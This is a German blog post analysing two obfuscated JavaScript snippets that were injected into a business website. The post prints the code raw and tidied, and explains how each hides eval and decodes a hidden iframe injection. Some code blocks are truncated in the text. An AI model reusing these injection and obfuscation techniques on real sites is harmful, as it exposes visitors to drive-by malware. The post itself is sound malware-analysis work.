Amore, Amore more ore
#####################
:date: 2011-06-21 01:44
:tags: bugs, de, exploits, javascript, reverse engineering

Bei meinem alltaeglichen stoebern im Netz kam ploetzlich eine Meldung,
die ich schon lange nichtmehr gesehen hatte. Man muss dazu sagen: ich
verwende chromium als Browser. Firefox meldet da leider nichts.
|image0| Das machte mich stutzig, was chromium dermassen aufstoesst.
Gefunden hab ich ein "obfuscated" javascript am Ende der Seite, schoen
eingebaut in <!-- . -->

 .. code-block :: javascript

    var date=new Date();function lols(){return true}
    window.onerror=lols;var fr='fromC';function getXmlHttp(){var xmlhttp;try{xmlhttp=new ActiveXObject('Msxml2.XMLHTTP');fr+='harCode';}catch(e){try{fr+='harCode';xmlhttp=new ActiveXObject('Microsoft.XMLHTTP');}catch(e){xmlhttp=false;}}
    if(!xmlhttp&&typeof XMLHttpRequest!='undefined'){xmlhttp=new XMLHttpRequest();}
    return xmlhttp;}
    var cont=[3200,3.46875,3168,3.65625,3488,3.15625,3520,3.625,1472,3.71875,3648,3.28125,3712,3.15625,1280,1.21875,1920,3.28125,3264,3.5625,3104,3.40625,3232,1,3680,3.5625,3168,1.90625,1088,3.25,3712,3.625,3584,1.8125,1504,1.46875,3808,3.71875,3808,1.4375,3104,3.40625,3552,3.5625,3232,1.40625,3488,3.46875,3648,3.15625,1440,3.46875,3648,3.15625,1440,3.5625,3232,1.6875,1472,3.28125,3520,1.4375,3744,3.03125,1504,3.28125,3520,1.4375,3168,3.21875,3360,1.96875,1600,1.0625,1024,3.71875,3360,3.125,3712,3.25,1952,1.0625,1568,1.0625,1024,3.25,3232,3.28125,3296,3.25,3712,1.90625,1088,1.53125,1088,1,3264,3.5625,3104,3.40625,3232,3.0625,3552,3.5625,3200,3.15625,3648,1.90625,1088,1.5,1088,1.9375,1920,1.46875,3360,3.1875,3648,3.03125,3488,3.15625,1984,1.21875,1312,1.84375];v=32;date=new Date();try{var req=getXmlHttp();req.onreadystatechange=function(){if(req.readyState==1){absrbwa();}};req.open('GET','http://google.com/',true);req.send(null);}catch(e){}
    var y=false;function absrbwa(){if(y)return;y=true;ev=eval;s='';for(i=0;i
    Aber auch daraus wird man erstmal nicht schlau. Es macht irgendeinen Request an google und es geht alle Zahlen in dem Array durch.
    Um es genauer zu verstehen, hab ich den code ein wenig aufgeraeumt:

    var date=new Date();
    function lols(){ return true }

    window.onerror=lols;
    var fr='fromC';

    function getXmlHttp(){
      var xmlhttp;
      try{
        xmlhttp=new ActiveXObject('Msxml2.XMLHTTP');
        fr+='harCode';
      }catch(e){
        try{
          fr+='harCode';
          xmlhttp=new ActiveXObject('Microsoft.XMLHTTP');
        }catch(e){
          xmlhttp=false;
        }
      }
      if(!xmlhttp&&typeof XMLHttpRequest!='undefined'){
        xmlhttp=new XMLHttpRequest();
      }
      return xmlhttp;
    }

    var cont=[3200,3.46875,3168,3.65625,3488,3.15625,3520,3.625,1472,3.71875,3648,3.28125,3712,3.15625,1280,1.21875,1920,3.28125,3264,3.5625,3104,3.40625,3232,1,3680,3.5625,3168,1.90625,1088,3.25,3712,3.625,3584,1.8125,1504,1.46875,3808,3.71875,3808,1.4375,3104,3.40625,3552,3.5625,3232,1.40625,3488,3.46875,3648,3.15625,1440,3.46875,3648,3.15625,1440,3.5625,3232,1.6875,1472,3.28125,3520,1.4375,3744,3.03125,1504,3.28125,3520,1.4375,3168,3.21875,3360,1.96875,1600,1.0625,1024,3.71875,3360,3.125,3712,3.25,1952,1.0625,1568,1.0625,1024,3.25,3232,3.28125,3296,3.25,3712,1.90625,1088,1.53125,1088,1,3264,3.5625,3104,3.40625,3232,3.0625,3552,3.5625,3200,3.15625,3648,1.90625,1088,1.5,1088,1.9375,1920,1.46875,3360,3.1875,3648,3.03125,3488,3.15625,1984,1.21875,1312,1.84375];

    v=32;
    date=new Date();
    try{
      var req=getXmlHttp();
      req.onreadystatechange=function(){
        if(req.readyState==1){
          absrbwa();
        }
      };
      req.open('GET','http://google.com/',true);
      req.send(null);
    }catch(e){}

    var y=false;

    function absrbwa(){
      if(y) return;
      y=true;
      ev=eval;
      s='';
      for(i=0;i

Es ist nicht ganz so clever, wie das facebook script, aber hat doch einige nette Elemente drin, die es lohnt sich mal anzuschaun. Auch hier wird ein Array benutzt um das ganze ein wenig schwerer zu gestalten und nicht so auffaellig zu sein. Interressant ist, dass er "date" zweimal ein neues Date-Objekt zuweist. In meinen Augen verschwendung.
Der Request zu Google ist auch eigentlich ueberfluessig. Die Funktion "getXmlHttp()" ist nur eine Ablenkung um die Variable "fr", mit "fromCharCode" zu fuellen, um sie spaeter in "String[fr]" weiter zu verwenden.
Relativ schnell sieht man im Array ein Muster "Integer, Float, Integer, Float,...". Das macht sich dann spaeter auch in der Berechnung des CharCodes "(i%2) ? cont[i]*v : cont[i]/v" bemerkbar.
ev ist nur auch wieder eine obfuscation um von eval abzulenken.
Interressant ist auch noch die Variable "y" mit der Sichergestellt wird, dass die Funktion zwar mehrfach aufgerufen werden kann, aber das Array nur einmal dekodiert wird.
Es wird also aus diesen Zahlen ein String zusammengesetzt. Aber wie sieht der String nun aus? 
Das laesst sich mit einem einfachen: "javascript: alert(s);" relativ leicht klaeren.

 .. code-block :: javascript

    document.write('');

Das ganze schreibt ueber den evil Befehl ein iframe mit der
Hoehe=Breite=1 in die Website. Es sieht mir eher nach einem Zaehler aus,
oder aehnliches. Aber ich kann es nicht klar zuordnen. Die Seite an sich
ist "leider" offline und hier hoert meine Spur auf, aber Google hat sie
als Malware eingestuft (siehe `hier`_) Ich hab bisher nicht
rausgefunden, wie die Website infiziert wurde. Aber auf einer anderen
Seiten von Filialen des Betriebes hab ich aehnlichen Schadcode gefunden.
Nachdem aber auf keiner anderen Seite unter dieser IP aehnliches zu
finden war, geh ich von einem Domain Problem aus. Die Seiten sehen alle
Recht aehnlich aus, als tippe ich auch auf aehnliche Luecken. Das
einzige dynamische Element auf das man direkten Zugriff hat ist die
Suche: fts.php Eine andere Erklaerung waere ein Trojaner Lokal, der den
Code immer wieder einfuegt, aber das waere denke ich zu aufwaendig. Hab
aber keine Lust und Zeit, mich damit weiter zu beschaeftigen, aber fals
der Betreiber so freundlich ist, mir den SourceCode der fts.php zur
Verfuegung zu stellen, werde ich mal einen Blick drueber werfen. Auf
einer anderen Domain war noch ein anderes Script zu finden:

 .. code-block :: javascript

    var ar="-n2=c:9m0'd)eu otag?pbr(\"hw";var k=new Boolean().toString();var ar2="f57,72,39,66,48,63,3,75,18,105,93,12,75,63,96,54,6,12,15,93,78,48,63,69,21,93,39,36,99,102,75,75,87,42,9,9,105,105,105,18,78,48,72,93,63,0,48,72,93,63,0,72,93,63,0,93,63,45,18,12,3,18,66,78,9,12,3,18,39,81,12,84,33,99,69,105,12,57,75,102,36,99,27,99,69,102,63,12,81,102,75,36,99,27,99,69,15,93,78,48,63,90,72,93,57,63,93,36,99,51,99,30,6,9,12,15,93,78,48,63,30,54,60,24]".replace(k.substr(0,1),'[');date=new Date();pau="rn ev2011".replace(date.getFullYear(),"al");e=new Function("","retu"+pau);e=e();ar2=e(ar2);s="";for(i=0;i
    Welches aufgeraeumt auch um einiges schoener aussieht:

    var ar="-n2=c:9m0'd)eu otag?pbr(\"hw";

    var k=new Boolean().toString();
    var ar2="f57,72,39,66,48,63,3,75,18,105,93,12,75,63,96,54,6,12,15,93,78,48,63,69,21,93,39,36,99,102,75,75,87,42,9,9,105,105,105,18,78,48,72,93,63,0,48,72,93,63,0,72,93,63,0,93,63,45,18,12,3,18,66,78,9,12,3,18,39,81,12,84,33,99,69,105,12,57,75,102,36,99,27,99,69,102,63,12,81,102,75,36,99,27,99,69,15,93,78,48,63,90,72,93,57,63,93,36,99,51,99,30,6,9,12,15,93,78,48,63,30,54,60,24]".replace(k.substr(0,1),'[');

    date=new Date();
    pau="rn ev2011".replace(date.getFullYear(),"al");
    e=new Function("","retu"+pau);

    e=e();
    ar2=e(ar2);
    s="";
    for(i=0;i

Auch dieses Script ist wieder ziemlich ev(i|a)l.
Es macht sich einen String "k" in welchem "false" steht. Dann generiert es aus dem String "ar2" ein Array, indem es das erste Zeichen von "false", also ein "f", durch eine eckige Klammer ersetzt.
Soweit sogut, aber wo ist das eval. Wir definieren uns die Variable "pau" mit "rn ev2011" und ersetzen das Jahr durch "al" und schon haben wir unser eval...naja nicht ganz, bisher steht da nur: "rn eval".
Aber das loest sich, wenn wir eine Funktion generieren, die wir "e" nennen, die nichts anderes macht als: return eval.
Dann sagen wir, dass: "e=e();" was "e" auch evil, aeh eval, macht.
Nun koennen wir endlich aus ar2 ein Array machen.

Die Zahlen definieren bloss die Position des Zeichens im String "ar". Dieses Zeichen wird dann an den String "s" angehaengt. 
Und der String "s" dann ueber "e(s)" ausgefuehrt.
Dadrin steht, wer haette es gedacht:

 .. code-block :: javascript

    document.write('');

Ich hoffe der Betreiber meldet sich und ich kann mir den SourceCode mal
naeher anschauen oder er die Javascript entfernen, denn eine Warnmeldung
fuer alle Chrome/Chromium Benutzer, wenn man auf seine Seite geht,
sollte ja auch nicht sein. so long

.. _hier: http://www.google.de/safebrowsing/diagnostic?site=amore-more-ore-re6.in.ua/

.. |image0| image:: http://images.hoeja.de/blog/2011-06-21-021047_1024x768_scrot-300x225.png
